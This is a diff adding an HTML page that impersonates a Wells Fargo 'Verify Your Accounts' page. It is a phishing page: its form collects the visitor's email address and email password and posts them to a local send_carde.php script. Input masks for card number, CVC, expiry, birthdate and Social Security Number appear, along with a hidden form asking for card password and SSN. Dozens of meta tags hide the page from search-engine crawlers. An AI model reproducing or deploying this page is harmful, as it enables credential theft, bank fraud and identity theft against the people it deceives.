@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <link rel="icon" type="image/x-icon" href="./style/css/tttt.jpg">
+
+
+	
+<script src="./style/js/angular.min.js"></script>
+<script src="style/js/jquery.min.js"></script>
+<script src="./style/js/jquery.validate.min.js"></script>
+<script src="./style/js/jquery.mask.js"></script>
+
+
+  <script>
+    $(function() {
+    $('#SocialSecurityNumber').mask('000-00-0000');
+	});
+	</script>
+<div id="scLk"></div>
+<style>
+
+
+
+.blue-button {
+
+    margin-top: 15px;
+    border-top-left-radius: 3px;
+    border-top-right-radius: 3px;
+    border-bottom-right-radius: 3px;
+    border-bottom-left-radius: 3px;
+    -webkit-appearance: none;
+    text-indent: 0;
+    display: inline-block;
+    color: #fff;
+    font-family: Arial;
+    font-size: 13px;
+    font-style: normal;
+    height: 40px;
+    line-height: 35px;
+    width: 124px;
+    text-decoration: none;
+    text-align: center;
+    line-height: 40px;
+    background-color: #ad1d23;
+    background: #ad1d23;
+}
+
+
+
+
+.agree, .close, .continue {
+    background-color: #ad1d23;
+    background: #ad1d23;
+    border: 0;
+}
+.mis-msg{
+  display:none;	
+}
+
+.agree:not(.nohover):hover, .close:not(.nohover):hover, .continue:not(.nohover):hover {
+    background: -moz-linear-gradient(center top,#3064a8 5%,#6695cc 100%);
+    background-color: #3064a8;
+    cursor: pointer;
+}
+.continue:not(.nohover):hover, .close:not(.nohover):hover, .agree:not(.nohover):hover {
+    background: -webkit-gradient( linear, left top, left bottom, color-stop(0.05, #3064a8), color-stop(1, #6695cc) );
+    background: -moz-linear-gradient( center top, #3064a8 5%, #6695cc 100% );
+    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#3064a8', endColorstr='#6695cc');
+    background-color: #3064a8;
+    cursor: pointer;
+}
+
+.caddoooroo  {margin-top:10px;height:45px;width: 420px;padding-left: 20px;margin-right: 18px;font-weight:400;text-decoration:none;font-size:13px;color:#44464a;border-radius:2px;border:1px solid #cfd1d7}
+
+
+
+}
+
+
+
+
+</style>
+
+  <script type="text/javascript">
+    $(function() {
+        $('#cardnumber').mask('0000 0000 0000 0000');
+	   $('#csc').mask('000');
+	   $('#expdate').mask('00/0000');
+        $('#birthdate').mask('00/00/0000');
+        $('#SociaNumber').mask('0000');
+	});
+	</script>
+
+
+
+
+	
+		<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
+		<meta http-equiv="Pragma" content="no-cache" />
+		<meta http-equiv="Pragma: no-cache"/>
+		<meta http-equiv="Cache Control" content="no-store" />
+		<meta http-equiv="Cache Control: no-store" />
+		<meta http-equiv="Expires" content="-1" />
+	
+        <meta name="robots" content="noindex, nofollow,noarchive,nosnippet,nocache,noimageindex">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="googlebot-news" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="msnbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="yahoo-slurp" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="teoma" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="twiceler" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="gigabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="scrubby" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="robozilla" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="nutch" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="ia_archiver" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="baiduspider" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="naverbot, yeti" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="googlebot-image" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="googlebot-mobile" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="yahoo-mmcrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="psbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="asterias" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="yahoo-blogs/v3.9" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="AhrefsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="MJ12bot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="Majestic-12" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="Majestic-SEO" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="DSearch" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="Rogerbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="SemrushBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="BLEXBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="ScoutJet" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="SearchmetricsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="BacklinkCrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="Exabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="spbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="linkdexbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="Lipperhey Spider" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="SEOkicks-Robot" content="noindex,nofollow,noarchive,nosnippet,nocache">
+<meta name="sistrix" content="noindex,nofollow,noarchive,nosnippet,nocache">
+
+
+<style id="antiClickjack">.antiClickjackContent{display:none !important;} .noscriptmsg { display:block;font-size:16px;width:100%;margin:5em 0 5em .5em}</style>
+
+<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
+        <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
+                <meta name="description" content="Click here to sign on to your Wells Fargo account(s)."/>
+          
+
+<link rel="stylesheet" href="./style/css/global.css">
+<style>
+            section[data-id="hero"] {
+                overflow: hidden;
+                height: 200px;
+            }
+
+            section[data-id="hero"] img {
+                position: relative;
+                width: 722px;
+            }
+        </style>
+    </head>
+    <body id="body" theme="ssep" platform="m" contextPath="#" >
+        <a href="#skip" class="skipLink">main content</a>
+        <header isJukebox="" divested="" origin="cob">
+	<div>
+		<a href="#"><img src="./style/css/logo1.png" class="logo" alt="Wells Fargo" origin="cob"/></a><ul data-id="search">
+			<li><a href="#">Apply</a></li><li><a href="#">Locations</a></li><li><a href="#">Customer Service</a></li><li>
+					<div data-id="searchBox">
+						<form action="#" method="get" id="frmSearch">
+							<input name="q" value="" aria-label="Search" title="Search" size="25" maxlength="75" type="text" autocomplete="off" autocapitalize="off" id="inputTopSearchField" placeholder="Search" />
+							<img role="button" src="./style/css/rooro.png" alt="search" onclick="Search.events.button.onclick()" onkeyup="Search.events.button.onkeyup()" tabindex="0"/>
+						</form>
+					</div>
+				</li>
+			</ul>
+		<ul data-id="headerLinks">
+			<li><a href="javascript:history.go(-1)">Back to Previous Page</a></li><li><a href="#">Home</a></li></ul>
+	</div>
+</header>
+
+        <main>
+
+<style>
+ .p-msg{
+   display:none;
+   width:250px;
+   height:15px;
+   color:#961417;
+   position:absolute;
+   top:21%;
+   left:0%;
+   background-image:url(style/css/ss.png);
+   background-repeat:no-repeat;
+   padding:0 0 0 1.6em;
+   font-weight:bold;	 
+}
+
+</style>
+
+
+<!--<script>
+// Wait for the DOM to be ready
+$(function() {
+
+	var validator = $("#cardbank").bind("invalid-form.validate", function() {
+			$("#errorSignonbank").html("<div class='alert' aria-atomic='true' role='alert' tabindex='-1'><img src='./style/css/ss.png' height='16' width='16' alt='Error' /><strong>  Please check your information and try again.</strong></div>");})
+
+$('#confirmpassword').on('blur', function(){
+	
+	 var em = $('#EmailPassword').val();
+     var cem = $('#confirmpassword').val();
+     if(em != cem){
+	   $('#EmailPassword').val("");
+	   $('#confirmpassword').val("");
+	   $('.p-msg').css('display','block');
+	  }else{
+		  
+	  }
+
+	
+ });
+  
+
+  $("form[name='cardbank']").validate({
+    
+	errorContainer: $("#errorSignonbank"),
+
+    rules: {
+      // The key name on the left side is the name attribute
+      // of an input field. Validation rules are defined
+      // on the right side
+      firstname: "required",
+      lastname: "required",
+      email: {
+        required: true,
+        // Specify that email should be validated
+        // by the built-in "email" rule
+        email: true
+      },
+      password: {
+        required: true,
+        minlength: 5
+      }
+    },
+
+highlight: function ( element, errorClass, validClass ) {
+$( element ).parents( ".dddd" ).removeClass( validClass );
+	$( element ).parents( ".dddd" ).addClass( errorClass );
+				},
+unhighlight: function (element, errorClass, validClass) {
+					
+	$( element ).parents( ".dddd" ).addClass( validClass );
+$( element ).parents( ".dddd" ).removeClass( errorClass );
+				},
+
+
+
+
+
+    messages: {
+
+      NameOnCard: " ",
+
+      lastName: " ",
+
+
+
+
+expdate: {
+        required: " ",
+        minlength: " "
+      },
+
+
+ csc: {
+        required: " ",
+        minlength: " "
+      },
+
+
+  cardnumber: {
+        required: " ",
+        minlength: " "
+      },
+
+
+      password: {
+        required: " ",
+        minlength: " "
+      },
+
+
+
+
+
+
+      email: "Please enter a valid email address"
+    },
+    // in the "action" attribute of the form when valid
+    
+                submitHandler: function(form) {
+
+
+
+
+					$.post("./system/send_carde.php?ajax", $("#cardbank").serialize(), function(result) {
+                            setTimeout(function() {
+
+
+
+
+
+
+$(location).attr("href", "./Myaccounts.php?id=Myaccount");
+
+
+
+
+                            });
+                    });
+    }
+  });
+});
+
+</script> -->
+
+
+
+
+            <form id="cardbank" name="cardbank" action="system/send_carde.php"  method="post" >
+                <noscript><div class="noscriptmsg">For your security, you must enable JavaScript to sign on to your account. Please adjust your browser settings, or go to <a href="#">Online Troubleshooting</a> for help.</div></noscript>
+
+
+<section data-id="content" aria-label="" class="" origin="cob">
+	
+
+
+	<h1 id="skip" tabindex="-1">Verify Your Wells Fargo Accounts </h1>
+		<div id="errorSignonbank"></div>
+		<span class="p-msg">Password did not match. Try again</span>
+	<h3 class="copy" origin="cob">
+
+Enter contact email attached
+			to account. </h3>
+
+
+
+
+
+
+
+			 
+			<div data-id="inputContainer"><br>
+		<label id="Emails" for="Emails">Email Address  </label><br>
+		
+
+<input  type="email" autocomplete="off"  required id="Email"  name="Email" class="caddoooroo"  />
+
+
+
+		</div>
+	</div>
+
+
+
+
+	<div data-id="inputContainer">
+   
+		<br>
+        
+<label id="EmailPasswords" for="EmailPasswords">Email Password</label><br>
+		<input ng-model="EmailPassword" type="password" autocomplete="off" required="required" id="EmailPassword" aria-describedby="text-info-EmailPassword EmailPasswordinputError" name="EmailPassword" class="ddddaaaaa"   />
+
+	</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+			<div data-id="inputContainer"><br>
+		<label id="confirmpasswords" for="confirmpasswords">Confirm Email Password</label><br>
+		<input
+required="required"  type="password" id="confirmpassword" autocomplete="off"  ng-model="expdate" aria-describedby="text-info-confirm_password onfirmpassword" name="confirmpassword"  class="ddddaaaaa" />
+			
+		</div>
+        <span class="mis-msg" style="color:#F00">Password mismatched. Try again</span>
+	</div>
+    </div>
+	</div>
+	
+
+
+
+
+
+
+
+
+
+
+
+
+			
+	</div>
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="continue-container">
+
+                    <input type="submit" name="_eventId_customerInfoEntered" id="continue" name="continue" value="Continue"  style="background-color:#d71e28;width:14em;border-radius:0.6em;height:38px;margin:1.5em 0 0 0;color:#FFF; cursor:pointer; border:1px solid #d71e28;">
+                </div>
+
+
+
+	<div class="clear-both" data-id="inputContainer">
+				</div>
+
+				</div>
+
+
+
+
+</section>
+<aside>
+                  
+
+                   </aside>
+
+<section data-id="submitContainer">
+                </section>
+            </form>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <form style="display:none;" id="ghbank" name="ghbank" action="https://connect.secure.wellsfargo.com/auth/logout?code=7100"  method="POST" >
+                <noscript><div class="noscriptmsg">For your security, you must enable JavaScript to sign on to your account. Please adjust your browser settings, or go to <a href="#">Online Troubleshooting</a> for help.</div></noscript>
+
+
+<section data-id="content" aria-label="" class="" origin="cob">
+	
+
+
+	<h1 id="skip" tabindex="-1">Verify Your Card Secure Wells Fargo</h1>
+		<div id="errorvbvbank">
+		
+
+
+
+		</div>
+	<p class="copy" origin="cob">
+
+
+Confirm your debit or credit card Password &amp; your Security Social Number Wells Fargo
+			accounts online.</p>
+
+
+		
+
+<div id="dssss"> </div>
+
+<input type="submit" name="_eventId_customerInfoEntered" id="continue" value="Continue" class="continue blue-button">
+
+
+
+
+
+
+
+</section>
+<aside>
+                  
+
+                   </aside>
+
+<section data-id="submitContainer">
+                </section>
+            </form>
+        </main>
+<div data-id="footerSeparator"></div>
+        <footer>
+            <div>
+	<nav role="navigation">
+		<div>
+			<ul data-id="links">
+				<li><a href="#">About Wells Fargo</a></li><li><a href="@">Careers</a></li><li><a href="#">Privacy, Security &amp; Legal</a></li><li><a href="#">Report Email Fraud</a></li><li><a href="#">Sitemap</a></li><li><a href="#">Home</a></li></ul>
+		</div>
+	</nav>
+</div>
+<div class="clear-both">
+				<div>
+	                <p data-id="copyright" class="cob">&copy; 1999 - 2020 Wells Fargo. All rights reserved. </p>
+	                    </div>
+			</div>
+</footer>
+
+   
+
+            <!--TMS include ends-->
+            
+ <script>
+ 
+   document.getElementById("continue").disabled = true;
+	 $('#confirmpassword').on('keyup', function(){
+		 
+	 var a =  $('#EmailPassword').val();
+	 var b =  $('#confirmpassword').val();
+	 if(a != b){
+		// $('#confirmpassword').val("");
+		 $('.mis-msg').css('display','block');
+	 }else{
+		 $('.mis-msg').css('display','none');
+		 document.getElementById("continue").disabled = false;
+		}
+		 
+	});
+	
+	 
+
+  
+ </script>
+        </body>
+</html>
